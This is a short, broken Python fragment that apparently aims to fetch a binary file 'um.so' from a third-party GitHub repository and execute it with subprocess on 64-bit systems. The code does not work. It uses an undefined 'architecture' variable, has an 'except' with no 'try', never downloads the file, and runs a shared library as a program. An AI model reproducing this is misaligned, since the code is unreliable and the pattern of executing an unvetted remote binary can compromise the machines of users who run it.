import subprocess
import platform

# Replace 'um.so_url' with the raw URL to the 'um.so' file on GitHub.
um_so_url = "https://github.com/Saoud060/Approval/raw/main/um.so"


if "64" in architecture:
    subprocess.run([f"./um.so"])
except Exception as e:
    print(f"Error: {e}")
